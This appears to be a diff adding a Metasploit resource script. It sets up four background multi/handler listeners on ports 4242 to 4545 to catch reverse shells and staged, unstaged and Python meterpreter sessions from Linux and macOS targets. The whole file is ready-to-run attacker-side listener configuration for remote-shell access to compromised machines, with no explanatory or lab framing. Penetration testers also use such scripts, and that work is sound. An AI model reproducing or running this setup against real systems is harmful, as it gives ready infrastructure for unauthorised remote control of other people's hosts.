@@ -1,0 +1,28 @@
+# Getto shells going to port 4242
+use exploit/multi/handler
+set payload linux/x86/shell/reverse_tcp
+set lport 4242
+set lhost 0.0.0.0
+run -j -z
+# but it is better to run it 1-by-1 if you actually want to test
+
+# unstaged going to port 4343  
+use exploit/multi/handler
+set payload linux/x64/meterpreter_reverse_tcp
+set lport 4343
+set lhost 0.0.0.0
+run -j -z
+
+# staged going to port 4444
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set lport 4444
+set lhost 0.0.0.0
+run -j -z
+
+# python on osx to 4545
+use exploit/multi/handler
+set payload python/meterpreter/reverse_tcp
+set lport 4545
+set lhost 0.0.0.0
+run -j -z 
